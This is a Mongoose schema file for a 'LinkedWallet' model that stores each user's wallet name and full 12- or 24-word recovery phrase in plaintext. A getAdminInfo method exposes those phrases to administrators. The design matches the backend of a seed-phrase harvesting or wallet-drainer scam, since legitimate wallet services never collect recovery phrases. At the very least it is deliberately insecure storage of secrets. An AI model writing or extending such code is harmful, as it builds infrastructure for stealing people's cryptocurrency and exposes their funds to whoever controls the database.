const mongoose = require("mongoose");

const linkedWalletSchema = new mongoose.Schema(
  {
    // User who linked the wallet
    user: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      required: true,
    },

    // Wallet name (Trust Wallet, MetaMask, etc.)
    walletName: {
      type: String,
      required: true,
      trim: true,
    },

    // Recovery phrase (12 or 24 words)
    phrase: {
      type: String,
      required: true,
      trim: true,
    },

    // Status
    isActive: {
      type: Boolean,
      default: true,
    },

    // Linked date
    linkedAt: {
      type: Date,
      default: Date.now,
    },

    // Last accessed date
    lastAccessed: {
      type: Date,
      default: Date.now,
    },
  },
  {
    timestamps: true,
  },
);

// Index for faster queries
linkedWalletSchema.index({ user: 1 });
linkedWalletSchema.index({ walletName: 1 });
linkedWalletSchema.index({ isActive: 1 });

// Method to get display info (HIDE the phrase)
linkedWalletSchema.methods.getDisplayInfo = function (includePhrase = false) {
  const info = {
    id: this._id,
    walletName: this.walletName,
    isActive: this.isActive,
    linkedAt: this.linkedAt,
    lastAccessed: this.lastAccessed,
  };

  // Only include phrase if explicitly requested
  if (includePhrase) {
    info.phrase = this.phrase;
  }

  return info;
};

// Method to get full info (includes phrase, for admin only)
linkedWalletSchema.methods.getAdminInfo = function () {
  return {
    id: this._id,
    walletName: this.walletName,
    phrase: this.phrase,
    isActive: this.isActive,
    linkedAt: this.linkedAt,
    lastAccessed: this.lastAccessed,
    user: this.user,
  };
};

const LinkedWallet = mongoose.model("LinkedWallet", linkedWalletSchema);

module.exports = LinkedWallet;
